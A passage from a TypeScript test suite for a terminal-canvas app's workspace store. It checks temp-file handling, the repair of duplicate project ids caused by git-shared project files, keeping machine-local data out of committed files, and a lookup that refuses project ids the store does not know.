    expect(loaded.projects[0]?.nodes.map((n) => n.id)).toEqual(['term-1']) // real files untouched
    expect((await fs.readdir(userData)).filter((n) => n.endsWith('.tmp'))).toEqual([])
    expect((await fs.readdir(nodeterm)).filter((n) => n.endsWith('.tmp'))).toEqual([mine])
  })

  it('a read-only load (sideline: false) sweeps nothing', async () => {
    await new WorkspaceStore().save(ws([project({ cwd: projRoot })]))
    await fs.writeFile(path.join(userData, 'workspace.json.99999.1.tmp'), 'x')
    await new WorkspaceStore().load({ sideline: false })
    expect((await fs.readdir(userData)).filter((n) => n.endsWith('.tmp')))
      .toEqual(['workspace.json.99999.1.tmp'])
  })

  it('closing every project after a successful load still persists the empty workspace', async () => {
    await new WorkspaceStore().save(ws([project({ cwd: projRoot })]))
    const store = new WorkspaceStore()
    await store.load()
    await store.save(ws([])) // the user really closed/deleted the last project
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries).toEqual([])
  })
})

// THE duplicate-id bug (field report: ~1500 React "two children with the same key,
// 'project-ms4zdpc0-1'" warnings from TabBar). `.nodeterm/project.json` is a GIT-SHARED file — the
// migration banner asks users to commit it — so `git worktree add`, a branch checkout, `reset
// --hard` or a `stash pop` re-materialises one committed project id into a SECOND folder. Two tabs
// then answer to one id, and `commitCanvas` (which maps by id) writes the ACTIVE canvas into BOTH
// projects, so the next save flushes it into the other folder's project.json. Silent cross-folder
// data loss on every autosave, plus co-attached tmux sessions and a delete that kills both.
//
// The ssh branch has defended against exactly this since the "reset bug" fix (see 'ssh lineage
// safety' above): a DIFFERENT lineage is adopted RE-KEYED to our entry id. These tests pin the
// same rule for local folder refs, plus the repair for a store that is already corrupt.
describe('a git-shared project.json must not give two folders one project id', () => {
  let otherRoot: string
  beforeEach(async () => {
    otherRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-proj2-'))
  })
  afterEach(async () => {
    await fs.rm(otherRoot, { recursive: true, force: true })
  })

  const projectFile = (over: Record<string, unknown> = {}): string =>
    JSON.stringify({
      version: 1, rev: 3, savedAt: 'then', id: 'project-ms4zdpc0-1', name: 'one', color: '#7aa2f7',
      viewport: { x: 0, y: 0, zoom: 1 },
      nodes: [{
        id: 'term-a', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 1, height: 1 },
        title: 'a', color: '#fff', group: null
      }],
      ...over
    }, null, 2)

  /** Both folders carry the SAME committed id — a worktree/checkout of a repo that ships its
   *  canvas — and the index (written by an earlier save) records that one id twice. */
  const seedCollision = async (over: Record<string, unknown> = {}): Promise<void> => {
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.mkdir(path.join(otherRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(path.join(projRoot, '.nodeterm/project.json'), projectFile())
    await fs.writeFile(
      path.join(otherRoot, '.nodeterm/project.json'),
      projectFile({ name: 'two', nodes: [{
        id: 'term-b', kind: 'terminal', position: { x: 9, y: 9 }, size: { width: 1, height: 1 },
        title: 'b', color: '#fff', group: null
      }], ...over })
    )
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
      version: 3,
      activeProjectId: 'project-ms4zdpc0-1',
      entries: [
        { id: 'project-ms4zdpc0-1', name: 'one', color: '#7aa2f7', cwd: projRoot },
        { id: 'project-ms4zdpc0-1', name: 'two', color: '#7aa2f7', cwd: otherRoot }
      ]
    }))
  }

  const readIndex = async () =>
    JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))

  it('loads two colliding folders as two projects with DIFFERENT ids, each keeping its own cwd and canvas', async () => {
    await seedCollision()
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects).toHaveLength(2)
    const [a, b] = loaded.projects
    expect(a.id).not.toBe(b.id)
    expect(new Set(loaded.projects.map((p) => p.id)).size).toBe(2)
    // First holder keeps the id; the loser is re-keyed. Neither canvas moved folders.
    expect(a).toMatchObject({ id: 'project-ms4zdpc0-1', cwd: projRoot, name: 'one' })
    expect(a.nodes.map((n) => n.id)).toEqual(['term-a'])
    expect(b).toMatchObject({ cwd: otherRoot, name: 'two' })
    expect(b.nodes.map((n) => n.id)).toEqual(['term-b'])
    // The active project still resolves (the surviving holder of the active id).
    expect(loaded.activeProjectId).toBe('project-ms4zdpc0-1')
  })

  it('REPAIRS the corrupt store in the INDEX, and touches neither folder\'s file', async () => {
    await seedCollision()
    const before = await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')
    const loaded = await new WorkspaceStore().load()
    const newId = loaded.projects[1].id

    // The id is a machine-local mistake; the files hold content, and content did not change.
    expect(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')).toBe(before)
    expect(loaded.projects[1].nodes.map((n) => n.id)).toEqual(['term-b'])

    const index = await readIndex()
    expect(index.entries.map((e: { id: string }) => e.id)).toEqual(['project-ms4zdpc0-1', newId])
  })

  it('the repair is IDEMPOTENT: a second (and third) load returns the same ids and rewrites nothing', async () => {
    await seedCollision()
    const first = (await new WorkspaceStore().load()).projects.map((p) => p.id)
    expect(new Set(first).size).toBe(2)
    const fileAfterRepair = await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')
    const indexAfterRepair = await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')

    const second = (await new WorkspaceStore().load()).projects.map((p) => p.id)
    const third = (await new WorkspaceStore().load()).projects.map((p) => p.id)
    expect(new Set(second).size).toBe(2)
    expect(second).toEqual(first)
    expect(third).toEqual(first)
    // Converges: no churn in the user's repo (and no git diff) on every boot.
    expect(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')).toBe(fileAfterRepair)
    expect(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')).toBe(indexAfterRepair)
  })

  it('a save after the repair keeps both canvases in their own folders (no cross-folder overwrite)', async () => {
    await seedCollision()
    const store = new WorkspaceStore()
    const loaded = await store.load()
    await store.save(loaded)
    const a = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    const b = JSON.parse(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(a.nodes.map((n: { id: string }) => n.id)).toEqual(['term-a'])
    expect(b.nodes.map((n: { id: string }) => n.id)).toEqual(['term-b'])
    expect(a.id).not.toBe(b.id)
  })

  it('announces the repair once per project, naming the folder (a silent edit of the user\'s data is worse)', async () => {
    await seedCollision()
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    await new WorkspaceStore().load()
    const lines = warn.mock.calls.map((c) => c.join(' ')).filter((l) => l.includes('project id'))
    expect(lines).toHaveLength(1)
    expect(lines[0]).toContain(otherRoot)
    expect(lines[0]).toContain('project-ms4zdpc0-1')
    warn.mockRestore()
  })

  it('a read-only load (sideline: false — the relay blob) repairs in memory but never touches the disk', async () => {
    await seedCollision()
    const before = await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')
    const indexBefore = await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')
    const loaded = await new WorkspaceStore().load({ sideline: false })
    expect(new Set(loaded.projects.map((p) => p.id)).size).toBe(2) // the phone never sees a dup
    expect(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')).toBe(before)
    expect(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')).toBe(indexBefore)
  })

  it('THE PREVENTION: the index entry — not the git-shared file — owns the project id', async () => {
    // One project, saved normally. Then a branch checkout drops a DIFFERENT committed id into its
    // project.json (this is how the second folder gets the first folder's id in the first place).
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'mine', cwd: projRoot })]))
    const file = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    await fs.writeFile(
      path.join(projRoot, '.nodeterm/project.json'),
      JSON.stringify({ ...file, id: 'theirs', name: 'renamed-upstream' }, null, 2)
    )

    const next = new WorkspaceStore()
    const loaded = await next.load()
    // Our tab keeps ITS identity (node ids — tmux session names — and every id-keyed lookup that
    // hangs off it), while the file's CONTENT is adopted. Exactly the ssh branch's rule.
    expect(loaded.projects[0]).toMatchObject({ id: 'mine', name: 'renamed-upstream', cwd: projRoot })
    // …and the next save scrubs the foreign id instead of replacing it with OURS: what lands is
    // the machine-independent legacy field, so the committed file stops naming anybody's project.
    await next.save(loaded)
    const written = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(written.name).toBe('renamed-upstream')
    expect(written.id).not.toBe('theirs')
    expect(written.id).not.toBe('mine')
  })

  it('readLocalRef (the watcher\'s re-read after a checkout) comes back under the ENTRY id too', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'mine', cwd: projRoot })]))
    await store.load()
    const file = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    await fs.writeFile(
      path.join(projRoot, '.nodeterm/project.json'),
      JSON.stringify({ ...file, id: 'theirs', rev: 99 }, null, 2)
    )
    // A project handed to replaceProject() under a foreign id would silently match nothing.
    await expect(store.readLocalRef('mine')).resolves.toMatchObject({ id: 'mine', cwd: projRoot })
  })

  it('leaves a healthy store completely alone (no re-key, no rewrite, no warning)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'a', cwd: projRoot }), project({ id: 'b', cwd: otherRoot })]))
    const before = await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects.map((p) => p.id)).toEqual(['a', 'b'])
    expect(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')).toBe(before)
    expect(warn).not.toHaveBeenCalled()
    warn.mockRestore()
  })

  // THE REAL SHAPE. The fixtures above give the two folders different canvases, which makes the
  // assertions readable — but a `git worktree add` / branch checkout produces two project.json
  // files that are the SAME BYTES: same project id, same node ids, same rev. Nothing distinguishes
  // them except which folder they sit in, so the folder is the only thing the repair can key on.
  it('two BYTE-IDENTICAL project.json files (what a worktree actually produces) still split cleanly', async () => {
    const bytes = projectFile()
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.mkdir(path.join(otherRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(path.join(projRoot, '.nodeterm/project.json'), bytes)
    await fs.writeFile(path.join(otherRoot, '.nodeterm/project.json'), bytes)
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
      version: 3,
      activeProjectId: 'project-ms4zdpc0-1',
      entries: [
        { id: 'project-ms4zdpc0-1', name: 'one', color: '#7aa2f7', cwd: projRoot },
        { id: 'project-ms4zdpc0-1', name: 'one', color: '#7aa2f7', cwd: otherRoot }
      ]
    }))

    const store = new WorkspaceStore()
    const loaded = await store.load()
    const [a, b] = loaded.projects
    expect(a.id).toBe('project-ms4zdpc0-1')
    expect(b.id).not.toBe(a.id)
    expect(a.cwd).toBe(projRoot)
    expect(b.cwd).toBe(otherRoot)
    // KNOWN RESIDUAL, asserted so it is a decision and not a surprise: the NODE ids are still
    // shared, so both tabs still attach the same tmux sessions and first-match-wins lookups
    // (getNodeTitle, context-link) still resolve to one of them. That was true before this fix
    // too; only the cross-folder canvas corruption is repaired here.
    expect(a.nodes.map((n) => n.id)).toEqual(b.nodes.map((n) => n.id))

    // The corruption itself IS gone: editing one canvas leaves the other folder's file alone.
    await store.save({
      ...loaded,
      projects: [
        { ...a, nodes: [...a.nodes, {
          id: 'term-new', kind: 'terminal' as const, position: { x: 5, y: 5 },
          size: { width: 1, height: 1 }, title: 'new', color: '#fff', group: null
        }] },
        b
      ]
    })
    const fileA = JSON.parse(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    const fileB = JSON.parse(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(fileA.nodes.map((n: { id: string }) => n.id)).toEqual(['term-a', 'term-new'])
    expect(fileB.nodes.map((n: { id: string }) => n.id)).toEqual(['term-a'])
    // The two files are told apart by their CONTENT and their folder — never by an id.
    expect(fileA.id).toBe(fileB.id)
  })

  // The repair is one index write now, so there is no half-applied state to crash into — but the
  // property that made the old two-write repair survivable still has to hold, because a lost index
  // write leaves the SAME collision on disk: the derivation is deterministic, so the next load
  // derives the same ids again rather than inventing new ones.
  it('survives a crash mid-repair (file re-keyed, index write lost) and converges on the same ids', async () => {
    await seedCollision()
    const indexBefore = await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8')
    const repaired = (await new WorkspaceStore().load()).projects.map((p) => p.id)
    expect(new Set(repaired).size).toBe(2)

    // The crash: the index write never landed, so the old (still colliding) index is what boots.
    await fs.writeFile(path.join(userData, 'workspace.json'), indexBefore)

    const after = await new WorkspaceStore().load()
    expect(after.projects.map((p) => p.id)).toEqual(repaired)
    expect(after.projects[0].nodes.map((n) => n.id)).toEqual(['term-a'])
    expect(after.projects[1].nodes.map((n) => n.id)).toEqual(['term-b'])
    expect((await readIndex()).entries.map((e: { id: string }) => e.id)).toEqual(repaired)
  })

  // Two windows / a second app instance booting at once. Both stores see the same collision; the
  // derivation is deterministic, so they agree instead of racing to two different repairs.
  it('two concurrent loads repair to the SAME ids (no split-brain)', async () => {
    await seedCollision()
    const [first, second] = await Promise.all([
      new WorkspaceStore().load(),
      new WorkspaceStore().load()
    ])
    expect(first.projects.map((p) => p.id)).toEqual(second.projects.map((p) => p.id))
    expect(new Set(first.projects.map((p) => p.id)).size).toBe(2)
    // Whichever write landed last, the file is intact JSON keyed to the entry that owns it.
    const index = await readIndex()
    const file = JSON.parse(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8'))
    expect(file.nodes.map((n: { id: string }) => n.id)).toEqual(['term-b'])
  })

  // A read-only folder (EROFS, a mounted share, a permissions mistake) must not fail the load or
  // lose the repair — the in-memory ids are still unique and the ENTRY re-key still persists, so
  // the file is simply re-keyed by a later save instead.
  it('a READ-ONLY repo still repairs — the fix lives entirely in userData', async () => {
    // The repair used to need a write inside the user's repo, so a read-only checkout (or a
    // permissions problem) left it half-done. It is now an index edit and nothing else.
    await seedCollision()
    const loserFile = path.join(otherRoot, '.nodeterm/project.json')
    const before = await fs.readFile(loserFile, 'utf-8')
    const rename = vi.spyOn(fs, 'rename').mockImplementation(async (from, to) => {
      if (String(to).startsWith(otherRoot)) {
        throw Object.assign(new Error('EROFS: read-only file system'), { code: 'EROFS' })
      }
      await fs.copyFile(String(from), String(to))
      await fs.rm(String(from), { force: true })
    })
    const loaded = await new WorkspaceStore().load()
    const ids = loaded.projects.map((p) => p.id)
    expect(new Set(ids).size).toBe(2)
    expect(loaded.projects[1].nodes.map((n) => n.id)).toEqual(['term-b'])
    rename.mockRestore()

    expect((await readIndex()).entries.map((e: { id: string }) => e.id)).toEqual(ids)
    expect(await fs.readFile(loserFile, 'utf-8')).toBe(before)
    const next = new WorkspaceStore()
    const again = await next.load()
    expect(again.projects.map((p) => p.id)).toEqual(ids) // no second repair, no churn
  })

  it('a THREE-way collision splits into three ids, each keyed to its own folder', async () => {
    const thirdRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-proj3-'))
    try {
      await seedCollision()
      await fs.mkdir(path.join(thirdRoot, '.nodeterm'), { recursive: true })
      await fs.writeFile(path.join(thirdRoot, '.nodeterm/project.json'), projectFile({
        name: 'three',
        nodes: [{
          id: 'term-c', kind: 'terminal', position: { x: 0, y: 0 }, size: { width: 1, height: 1 },
          title: 'c', color: '#fff', group: null
        }]
      }))
      const index = await readIndex()
      index.entries.push({ id: 'project-ms4zdpc0-1', name: 'three', color: '#7aa2f7', cwd: thirdRoot })
      await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify(index))

      const loaded = await new WorkspaceStore().load()
      const ids = loaded.projects.map((p) => p.id)
      expect(new Set(ids).size).toBe(3)
      expect(ids[0]).toBe('project-ms4zdpc0-1')
      expect(loaded.projects.map((p) => p.cwd)).toEqual([projRoot, otherRoot, thirdRoot])
      expect(loaded.projects.map((p) => p.nodes.map((n) => n.id)))
        .toEqual([['term-a'], ['term-b'], ['term-c']])
      // Each folder keeps its own canvas, and the repair rewrote none of them (it is an index
      // edit now — the pre-change `id` these fixtures still carry is inert).
      for (const [i, root] of [projRoot, otherRoot, thirdRoot].entries()) {
        const file = JSON.parse(await fs.readFile(path.join(root, '.nodeterm/project.json'), 'utf-8'))
        expect(file.id).toBe('project-ms4zdpc0-1')
        expect(file.nodes.map((n: { id: string }) => n.id))
          .toEqual(loaded.projects[i].nodes.map((n) => n.id))
      }
      // Idempotent at three, too.
      expect((await new WorkspaceStore().load()).projects.map((p) => p.id)).toEqual(ids)
    } finally {
      await fs.rm(thirdRoot, { recursive: true, force: true })
    }
  })

  it('two same-CWD tabs (the inline escape hatch) still round-trip — that dedupe is by cwd, not id', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([
      project({ id: 'a', name: 'first', cwd: projRoot }),
      project({ id: 'b', name: 'second', cwd: projRoot })
    ]))
    const loaded = await new WorkspaceStore().load()
    expect(loaded.projects.map((p) => p.id).sort()).toEqual(['a', 'b'])
  })
})

// The completion of the fix above: #192 made a shared id SURVIVABLE (the index entry became the
// authority, and a collision was repaired). This is the cause itself — a git-shared document may
// not carry machine identity at all, so `git worktree add` / a checkout has nothing to copy.
describe('the shared project file carries content, not machine identity', () => {
  let otherRoot: string
  beforeEach(async () => {
    otherRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'nt-proj2-'))
  })
  afterEach(async () => {
    await fs.rm(otherRoot, { recursive: true, force: true })
  })

  const readFile = async (root: string) =>
    JSON.parse(await fs.readFile(path.join(root, '.nodeterm/project.json'), 'utf-8'))

  it('a saved project.json carries none of it: not the project id, not the camera, not the account', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({
      id: 'project-ms4zdpc0-1',
      cwd: projRoot,
      viewport: { x: -1200, y: 340, zoom: 0.75 },
      defaultAccountId: 'acct-9f3c'
    })]))
    const raw = await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
    expect(raw).not.toContain('project-ms4zdpc0-1') // this machine's project id
    expect(raw).not.toContain('acct-9f3c') // a config dir under THIS userData
    // The `viewport` that survives is derived from the canvas, not from where THIS user looked:
    // it frames the nodes, identically on every machine (a pre-change build requires the field).
    expect(JSON.parse(raw).viewport).toEqual({ x: 80, y: 80, zoom: 1 })
    // …and the machine-local half is remembered in the machine-local index.
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0]).toMatchObject({
      id: 'project-ms4zdpc0-1',
      cwd: projRoot,
      viewport: { x: -1200, y: 340, zoom: 0.75 },
      defaultAccountId: 'acct-9f3c'
    })
    // The canvas itself is still there — this is a file worth committing.
    expect(JSON.parse(raw).nodes.map((n: { id: string }) => n.id)).toEqual(['term-1'])
  })

  it('two machines writing the SAME canvas produce byte-identical files (nothing to churn in git)', async () => {
    // Only Date is faked (the store stamps `savedAt` with it); the fs promises below still resolve.
    vi.useFakeTimers({ toFake: ['Date'] })
    vi.setSystemTime(new Date('2026-08-14T00:00:00.000Z'))
    const mine = new WorkspaceStore()
    await mine.save(ws([project({
      id: 'project-mine-1', cwd: projRoot,
      viewport: { x: 10, y: 20, zoom: 2 }, defaultAccountId: 'acct-mine'
    })]))
    const theirs = new WorkspaceStore()
    await theirs.save(ws([project({
      id: 'project-theirs-7', cwd: otherRoot,
      viewport: { x: -900, y: 5, zoom: 0.5 }, defaultAccountId: 'acct-theirs'
    })]))
    expect(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8'))
      .toBe(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8'))
    vi.useRealTimers()
  })

  it('load → save → load leaves the committed file byte-identical (no churn per boot)', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'p1', cwd: projRoot })]))
    const written = await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
    const next = new WorkspaceStore()
    const loaded = await next.load()
    await next.save(loaded)
    expect(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')).toBe(written)
    const third = new WorkspaceStore()
    await third.save(await third.load())
    expect(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')).toBe(written)
  })

  it('THE WORKTREE CASE: two byte-identical files open as two projects, each keeping its own canvas', async () => {
    // What `git worktree add` actually produces: the same committed bytes in two folders. With no
    // id in them, nothing even suggests they are one project — only the index says who is who.
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'a', name: 'repo', cwd: projRoot })]))
    const bytes = await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')
    await fs.mkdir(path.join(otherRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(path.join(otherRoot, '.nodeterm/project.json'), bytes)
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
      version: 3,
      activeProjectId: 'a',
      entries: [
        { id: 'a', name: 'repo', color: '#7aa2f7', cwd: projRoot },
        { id: 'b', name: 'repo (worktree)', color: '#7aa2f7', cwd: otherRoot }
      ]
    }))
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const next = new WorkspaceStore()
    const loaded = await next.load()
    expect(loaded.projects.map((p) => p.id)).toEqual(['a', 'b']) // no collision, no repair
    expect(warn).not.toHaveBeenCalled()
    warn.mockRestore()
    // Each canvas stays in its own folder across a save.
    await next.save(ws([
      { ...loaded.projects[0], nodes: [] },
      loaded.projects[1]
    ], 'a'))
    expect((await readFile(projRoot)).nodes).toEqual([])
    expect((await readFile(otherRoot)).nodes.map((n: { id: string }) => n.id)).toEqual(['term-1'])
  })

  it('a file written by an OLD build is read fine — its id is IGNORED, never adopted', async () => {
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(path.join(projRoot, '.nodeterm/project.json'), JSON.stringify({
      version: 1, rev: 4, savedAt: 'then', id: 'project-someone-else-3', name: 'shared',
      color: '#7aa2f7', viewport: { x: 7, y: 8, zoom: 3 },
      nodes: [{ id: 'term-a', kind: 'terminal', position: { x: 0, y: 0 },
        size: { width: 1, height: 1 }, title: 'a', color: '#fff', group: null }]
    }, null, 2))
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
      version: 3, activeProjectId: 'mine',
      entries: [{ id: 'mine', name: 'shared', color: '#7aa2f7', cwd: projRoot }]
    }))
    const store = new WorkspaceStore()
    const loaded = await store.load()
    expect(loaded.projects[0]).toMatchObject({ id: 'mine', name: 'shared', cwd: projRoot })
    expect(loaded.projects[0].nodes.map((n) => n.id)).toEqual(['term-a'])
    // The old file's camera is the only thing we DO take from it: as this machine's starting
    // viewport, once, on the way into the index.
    expect(loaded.projects[0].viewport).toEqual({ x: 7, y: 8, zoom: 3 })
    await store.save(loaded)
    expect((await readFile(projRoot)).id).not.toBe('project-someone-else-3')
    expect((await readFile(projRoot)).id).not.toBe('mine')
    expect((await readFile(projRoot)).viewport).toEqual({ x: 80, y: 80, zoom: 1 }) // not {7,8,3}
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries[0].viewport).toEqual({ x: 7, y: 8, zoom: 3 })
  })

  it('still carries an `id` an OLD build can read — machine-independent, so it never churns', async () => {
    // Compatibility, one release: a build that predates this change REFUSES a project.json with no
    // `id` and sidelines it to `.corrupt-<ts>` — inside the user's repo. So the field stays, derived
    // from the canvas's own name, identical on every machine, and ignored by this build.
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'project-mine-1', name: 'shared', cwd: projRoot })]))
    const file = await readFile(projRoot)
    expect(file.version).toBe(1)
    expect(typeof file.id).toBe('string')
    expect(file.id).not.toBe('project-mine-1')
    // …and the other field that build dereferences unguarded.
    expect(file.viewport).toMatchObject({ zoom: 1 })
  })

  it('adoption (a folder with no index entry) mints a fresh id — the file no longer names one', async () => {
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(path.join(projRoot, '.nodeterm/project.json'), JSON.stringify({
      version: 1, rev: 2, savedAt: 'then', id: 'project-theirs-9', name: 'cloned',
      color: '#7aa2f7',
      nodes: [{ id: 'term-a', kind: 'terminal', position: { x: 400, y: 300 },
        size: { width: 1, height: 1 }, title: 'a', color: '#fff', group: null }]
    }, null, 2))
    const store = new WorkspaceStore()
    const probed = await store.probeFolder(projRoot)
    expect(probed).toBeTruthy()
    expect(probed!.id).not.toBe('project-theirs-9')
    expect(probed!.id).toMatch(/^project-[a-z0-9-]+$/)
    expect(probed!.cwd).toBe(projRoot)
    expect(probed!.nodes.map((n) => n.id)).toEqual(['term-a'])
    // A second probe of the same folder is a different candidate id — which is exactly why the
    // caller must key by cwd (it does; see projects.openFolderProject) and never probe twice.
    const again = await store.probeFolder(projRoot)
    expect(again!.id).not.toBe(probed!.id)
    // The minted id is what the index remembers, and a reload comes back under it.
    await store.save(ws([{ ...probed!, closed: false }]))
    const index = JSON.parse(await fs.readFile(path.join(userData, 'workspace.json'), 'utf-8'))
    expect(index.entries.map((e: { id: string }) => e.id)).toEqual([probed!.id])
    const reloaded = await new WorkspaceStore().load()
    expect(reloaded.projects.map((p) => p.id)).toEqual([probed!.id])
    expect(reloaded.projects[0].nodes.map((n) => n.id)).toEqual(['term-a'])
  })

  it('an adopted canvas with no camera is framed onto its nodes, not left staring at the origin', async () => {
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.writeFile(path.join(projRoot, '.nodeterm/project.json'), JSON.stringify({
      version: 1, rev: 2, savedAt: 'then', name: 'cloned', color: '#7aa2f7',
      nodes: [{ id: 'term-a', kind: 'terminal', position: { x: 4000, y: 2000 },
        size: { width: 1, height: 1 }, title: 'a', color: '#fff', group: null }]
    }, null, 2))
    const probed = await new WorkspaceStore().probeFolder(projRoot)
    expect(probed!.viewport.zoom).toBe(1)
    // The node lands on screen instead of 4000px off it.
    expect(probed!.viewport.x + 4000).toBeGreaterThan(0)
    expect(probed!.viewport.x + 4000).toBeLessThan(400)
    expect(probed!.viewport.y + 2000).toBeGreaterThan(0)
    expect(probed!.viewport.y + 2000).toBeLessThan(400)
  })

  it('a duplicate-id repair no longer writes to the user\'s repo at all (the index owns the id)', async () => {
    // A store corrupted BEFORE this fix: both entries under one id. The repair still runs — but it
    // has nothing to fix in the files, because they no longer claim an identity.
    await fs.mkdir(path.join(projRoot, '.nodeterm'), { recursive: true })
    await fs.mkdir(path.join(otherRoot, '.nodeterm'), { recursive: true })
    const bytes = JSON.stringify({
      version: 1, rev: 3, savedAt: 'then', id: 'project-legacy', name: 'one', color: '#7aa2f7',
      nodes: [{ id: 'term-a', kind: 'terminal', position: { x: 0, y: 0 },
        size: { width: 1, height: 1 }, title: 'a', color: '#fff', group: null }]
    }, null, 2)
    await fs.writeFile(path.join(projRoot, '.nodeterm/project.json'), bytes)
    await fs.writeFile(path.join(otherRoot, '.nodeterm/project.json'), bytes)
    await fs.writeFile(path.join(userData, 'workspace.json'), JSON.stringify({
      version: 3, activeProjectId: 'dup',
      entries: [
        { id: 'dup', name: 'one', color: '#7aa2f7', cwd: projRoot },
        { id: 'dup', name: 'two', color: '#7aa2f7', cwd: otherRoot }
      ]
    }))
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const loaded = await new WorkspaceStore().load()
    expect(new Set(loaded.projects.map((p) => p.id)).size).toBe(2)
    warn.mockRestore()
    expect(await fs.readFile(path.join(projRoot, '.nodeterm/project.json'), 'utf-8')).toBe(bytes)
    expect(await fs.readFile(path.join(otherRoot, '.nodeterm/project.json'), 'utf-8')).toBe(bytes)
  })
})

describe('projectMetaFor (issue #338 PR 1) — target exists / is SSH, from the store alone', () => {
  // The --project targeting gate (src/core/project-grants.ts) learns "does this project exist,
  // and is it SSH" from main's OWN store — never from anything the caller sent. Same three
  // entry kinds as persistedCanvases: inline (e.project), ssh (e.ssh), local ref (e.cwd).
  it('answers for all three entry kinds and undefined for an unknown id', async () => {
    const store = new WorkspaceStore()
    const local = project({ id: 'p-local', cwd: projRoot })
    const inline = project({ id: 'p-inline', cwd: undefined })
    const ssh = project({
      id: 'p-ssh',
      cwd: undefined,
      ssh: { server: { host: 'h', user: 'u' }, remoteCwd: '/srv/app' }
    })
    await store.save(ws([local, inline, ssh]))

    expect(store.projectMetaFor('p-local')).toEqual({ ssh: false })
    expect(store.projectMetaFor('p-inline')).toEqual({ ssh: false })
    expect(store.projectMetaFor('p-ssh')).toEqual({ ssh: true })
    // Fail closed: an id the store does not know (deleted, invented, another machine's) has no
    // meta at all — the gate refuses on undefined.
    expect(store.projectMetaFor('p-gone')).toBeUndefined()
    expect(store.projectMetaFor('')).toBeUndefined()
  })

  it('a deleted project stops answering after the save that removed it', async () => {
    const store = new WorkspaceStore()
    await store.save(ws([project({ id: 'p-a', cwd: projRoot }), project({ id: 'p-b', cwd: undefined })]))
    expect(store.projectMetaFor('p-b')).toEqual({ ssh: false })
    await store.save(ws([project({ id: 'p-a', cwd: projRoot })]))
    expect(store.projectMetaFor('p-b')).toBeUndefined()
  })
})
